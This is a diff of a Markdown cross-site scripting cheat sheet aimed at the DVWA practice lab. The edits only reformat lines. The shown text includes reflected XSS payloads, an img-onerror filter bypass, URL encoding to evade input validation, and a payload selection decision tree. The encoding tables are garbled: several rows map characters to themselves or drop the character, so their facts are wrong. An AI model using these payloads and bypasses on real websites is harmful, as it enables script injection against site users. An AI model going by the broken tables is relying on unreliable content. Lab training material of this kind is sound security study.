@@ -164,6 +164,7 @@ alert('XSS')
 URL: http://dvwa.local/xss_r/?name=%3Cscript%3Ealert('XSS')%3C/script%3E
 
 Decoded: <script>alert('XSS')</script>
+
 **When:** Raw angle brackets rejected by server  
 **Why:** URL encoding bypasses input validation  
 **Effectiveness:** High (browser auto-decodes)
@@ -334,12 +335,12 @@ Result: ✓ Alert triggered from client-side JS
 ## PAYLOAD SELECTION DECISION TREE
 
 Is input in HTML body?
-├─ YES
-│ ├─ <script> tag filtered?
-│ │ ├─ YES → Try <img src=x onerror="alert()">
-│ │ └─ NO → Try <script>alert('XSS')</script>
-│ └─ Quote marks in output?
-│ └─ Check for encoding (if " appears, check browser)
+├─  YES
+│  ├─ <script> tag filtered?
+│  │ ├─ YES → Try <img src=x onerror="alert()">
+│  │ └─ NO → Try <script>alert('XSS')</script>
+│  └─ Quote marks in output?
+│  └─ Check for encoding (if " appears, check browser)
 │
 ├─ Is input in HTML attribute?
 │ ├─ YES
@@ -366,30 +367,29 @@ Is input in HTML body?
 
 ### URL Encoding
 
-< = %3C
-
-= %3E
-" = %22
-' = %27
-= %20
+- < = %3C
+- = %3E
+- " = %22
+- ' = %27
+- = %20
 
 
 ### HTML Encoding
 
-< = <
-= >
-" = "
-' = '
-& = &
+- < = <
+- = >
+- " = "
+- ' = '
+- & = &
 
 
 ### JavaScript Encoding
 
-" = "
-' = '
-\ = \
-newline = \n
-tab = \t
+- " = "
+- ' = '
+- \ = \
+- newline = \n
+- tab = \t
 
 ---
 
